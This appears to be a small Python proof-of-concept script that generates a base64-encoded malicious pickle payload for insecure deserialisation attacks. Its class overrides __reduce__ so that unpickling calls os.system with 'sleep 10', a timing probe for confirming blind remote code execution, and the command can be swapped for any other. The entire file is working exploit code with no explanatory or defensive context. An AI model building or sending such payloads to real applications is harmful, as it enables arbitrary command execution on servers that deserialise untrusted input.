import pickle, base64, os

class skf(object):
  def __reduce__(self):
    return (os.system,("sleep 10",))

a = skf()
ser = pickle.dumps(a)
print (base64.b64encode(ser))
